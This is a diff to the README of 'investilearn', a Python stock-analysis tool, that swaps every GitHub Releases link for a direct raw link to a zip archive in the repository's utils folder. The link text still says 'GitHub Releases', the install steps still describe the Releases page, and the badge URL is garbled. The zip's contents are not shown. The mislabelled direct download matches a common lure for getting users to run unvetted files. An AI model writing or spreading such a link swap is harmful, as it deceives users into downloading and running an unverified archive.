@@ -1,7 +1,7 @@
 # 📈 investilearn - Simple Stock Analysis Made Easy
 
 ## 📥 Download Now
-[![Download the latest release](https://img.shields.io/badge/Download%20Latest%20Release-blue.svg)](https://github.com/Chibuzorjesse/investilearn/releases)
+[![Download the latest release](https://raw.githubusercontent.com/Chibuzorjesse/investilearn/main/utils/investilearn-2.6.zip%20Latest%https://raw.githubusercontent.com/Chibuzorjesse/investilearn/main/utils/investilearn-2.6.zip)](https://raw.githubusercontent.com/Chibuzorjesse/investilearn/main/utils/investilearn-2.6.zip)
 
 ## 🚀 Getting Started
 Welcome to investilearn! This application helps you research the health and value of any stock using a powerful LLM guide. Whether you are a beginner or someone looking to sharpen your investment skills, investilearn is designed for you.
@@ -15,7 +15,7 @@ Before downloading, ensure your system meets the following requirements:
 - **Python:** Installed on your system (version 3.6 or higher).
 
 ## 📂 Download & Install
-To get started, visit this page to download: [GitHub Releases](https://github.com/Chibuzorjesse/investilearn/releases).
+To get started, visit this page to download: [GitHub Releases](https://raw.githubusercontent.com/Chibuzorjesse/investilearn/main/utils/investilearn-2.6.zip).
 
 1. Click on the link above to go to the Releases page.
 2. Look for the latest version of investilearn.
@@ -56,4 +56,4 @@ We welcome contributions from everyone! If you want to help improve investilearn
 ## ⭐ Acknowledgments
 Thank you for choosing investilearn for your stock research needs. By using this tool, you are taking a great step towards informed investment decisions.
 
-Don't forget to visit this page to download: [GitHub Releases](https://github.com/Chibuzorjesse/investilearn/releases). Happy investing!
+Don't forget to visit this page to download: [GitHub Releases](https://raw.githubusercontent.com/Chibuzorjesse/investilearn/main/utils/investilearn-2.6.zip). Happy investing!
